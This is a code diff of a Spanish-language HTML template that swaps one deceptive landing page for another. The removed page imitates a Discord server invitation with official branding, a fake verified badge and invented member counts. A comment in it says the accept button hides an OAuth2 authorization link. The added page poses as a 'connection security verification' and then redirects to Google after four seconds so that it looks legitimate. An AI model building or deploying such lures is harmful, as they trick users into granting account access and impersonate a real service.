@@ -1,193 +1,203 @@
 <!DOCTYPE html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
-    <!-- Fuente oficial de Discord (aproximada con Outfit) -->
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Seguridad del Sistema | Verificando...</title>
+    <!-- Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
     <style>
-        /* Estilos Base Estilo Discord Dark */
-        :root {
-            --bg-main: #313338;
-            --bg-card: #2b2d31;
-            --blurple: #5865f2;
-            --blurple-hover: #4752c4;
-            --text-muted: #b5bac1;
-            --text-header: #f2f3f5;
-            --text-normal: #dbdee1;
-            --green: #23a55a;
-        }
+      :root {
+        --primary: #00d2ff;
+        --secondary: #3a7bd5;
+        --bg: #0b0e14;
+        --glass: rgba(255, 255, 255, 0.03);
+        --border: rgba(255, 255, 255, 0.08);
+      }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Outfit', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Outfit", sans-serif;
+      }
 
-        body {
-            background-color: var(--bg-main);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-image: url('https://discord.com/assets/2c21aeda16de354ba533.png'); /* Fondo de burbujas oficial */
-            background-size: cover;
-        }
+      body {
+        background-color: var(--bg);
+        background-image: radial-gradient(
+            circle at 20% 20%,
+            rgba(58, 123, 213, 0.15) 0%,
+            transparent 40%
+          ),
+          radial-gradient(
+            circle at 80% 80%,
+            rgba(0, 210, 255, 0.15) 0%,
+            transparent 40%
+          );
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        overflow: hidden;
+      }
 
-        .invite-card {
-            background-color: var(--bg-card);
-            width: 100%;
-            max-width: 480px;
-            padding: 32px;
-            border-radius: 8px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
-            text-align: center;
-            animation: fadeIn 0.4s ease-out;
-        }
+      .card {
+        background: var(--glass);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        border: 1px solid var(--border);
+        padding: 50px 40px;
+        border-radius: 24px;
+        text-align: center;
+        width: 90%;
+        max-width: 400px;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        animation: fadeIn 0.8s ease-out;
+      }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
         }
-
-        .guild-icon {
-            width: 80px;
-            height: 80px;
-            border-radius: 28px;
-            background-color: #313338;
-            margin-bottom: 20px;
-            object-fit: cover;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        to {
+          opacity: 1;
+          transform: translateY(0);
         }
+      }
 
-        .guild-icon:hover {
-            transform: scale(1.1);
+      .icon-container {
+        position: relative;
+        width: 80px;
+        height: 80px;
+        margin: 0 auto 25px;
+      }
+
+      .loader {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: 3px solid rgba(255, 255, 255, 0.05);
+        border-top: 3px solid var(--primary);
+        border-radius: 50%;
+        animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      }
+
+      .shield-icon {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 32px;
+        color: var(--primary);
+        text-shadow: 0 0 20px rgba(0, 210, 255, 0.5);
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
         }
-
-        .invite-header {
-            color: var(--text-muted);
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.02em;
-            margin-bottom: 8px;
+        100% {
+          transform: rotate(360deg);
         }
+      }
 
-        .guild-name {
-            color: var(--text-header);
-            font-size: 24px;
-            font-weight: 600;
-            line-height: 30px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+      h1 {
+        font-size: 22px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        letter-spacing: 0.5px;
+      }
+
+      p {
+        color: #94a3b8;
+        font-size: 15px;
+        line-height: 1.6;
+        margin-bottom: 20px;
+      }
+
+      .status-badge {
+        display: inline-flex;
+        align-items: center;
+        background: rgba(0, 210, 255, 0.1);
+        color: var(--primary);
+        padding: 6px 14px;
+        border-radius: 100px;
+        font-size: 12px;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        border: 1px solid rgba(0, 210, 255, 0.2);
+      }
+
+      .pulse {
+        width: 6px;
+        height: 6px;
+        background: var(--primary);
+        border-radius: 50%;
+        margin-right: 8px;
+        box-shadow: 0 0 0 rgba(0, 210, 255, 0.4);
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0% {
+          box-shadow: 0 0 0 0 rgba(0, 210, 255, 0.7);
         }
-
-        .verified-badge {
-            color: var(--blurple);
-            font-size: 18px;
+        70% {
+          box-shadow: 0 0 0 10px rgba(0, 210, 255, 0);
         }
-
-        .status-info {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-bottom: 30px;
-            font-size: 14px;
+        100% {
+          box-shadow: 0 0 0 0 rgba(0, 210, 255, 0);
         }
+      }
 
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: var(--text-muted);
-        }
-
-        .dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-        }
-
-        .dot-online { background-color: var(--green); }
-        .dot-members { background-color: #b5bac1; }
-
-        .btn-accept {
-            background-color: var(--blurple);
-            color: white;
-            text-decoration: none;
-            padding: 12px 24px;
-            border-radius: 3px;
-            font-size: 16px;
-            font-weight: 500;
-            display: block;
-            width: 100%;
-            transition: background-color 0.1s, transform 0.1s;
-            margin-bottom: 12px;
-        }
-
-        .btn-accept:hover {
-            background-color: var(--blurple-hover);
-        }
-
-        .btn-accept:active {
-            transform: translateY(1px);
-        }
-
-        .footer-text {
-            color: var(--text-muted);
-            font-size: 12px;
-            line-height: 16px;
-            margin-top: 16px;
-        }
-
-        .footer-link {
-            color: var(--blurple);
-            text-decoration: none;
-        }
-
-        .footer-link:hover {
-            text-decoration: underline;
-        }
+      footer {
+        margin-top: 30px;
+        font-size: 11px;
+        color: #475569;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
+    <div class="card">
+      <div class="icon-container">
+        <div class="loader"></div>
+        <div class="shield-icon">🛡️</div>
+      </div>
 
-    <div class="invite-card">
-        <!-- Logo de Pinterest del usuario -->
-        <img src="https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg" class="guild-icon" alt="Server Icon">
-        
-        <div class="invite-header">Has recibido una invitación para unirte a</div>
-        
-        <div class="guild-name">
-            Servidor de al3xg0nzalezzz
-            <span class="verified-badge">✔</span>
-        </div>
+      <div class="status-badge">
+        <span class="pulse"></span>
+        Escaneando Cifrado
+      </div>
 
-        <div class="status-info">
-            <div class="status-item">
-                <span class="dot dot-online"></span>
-                <span>1,248 en línea</span>
-            </div>
-            <div class="status-item">
-                <span class="dot dot-members"></span>
-                <span>8,590 miembros</span>
-            </div>
-        </div>
+      <h1 style="margin-top: 20px">Verificando Acceso</h1>
+      <p>
+        Estamos validando la integridad de su conexión para garantizar una
+        navegación segura.
+      </p>
 
-        <!-- El link de OAuth2 camuflado como botón de invitación -->
-        <a href="{{ auth_url }}" class="btn-accept">Aceptar Invitación</a>
-        
-        <div class="footer-text">
-            Al aceptar la invitación, confirmas que has leído y aceptas las 
-            <a href="#" class="footer-link">Reglas de la Comunidad</a>.
-        </div>
+      <p style="font-size: 13px; color: #64748b">
+        Espere un momento, por favor...
+      </p>
+
+      <footer>Powered by al3xg0nzalezzz</footer>
     </div>
 
-</body>
+    <script>
+      // Redirigir a un sitio real (como Google o una noticia) después de 4 segundos
+      // para que parezca una redirección legítima.
+      setTimeout(() => {
+        window.location.href = "https://www.google.com";
+      }, 4000);
+    </script>
+  </body>
 </html>
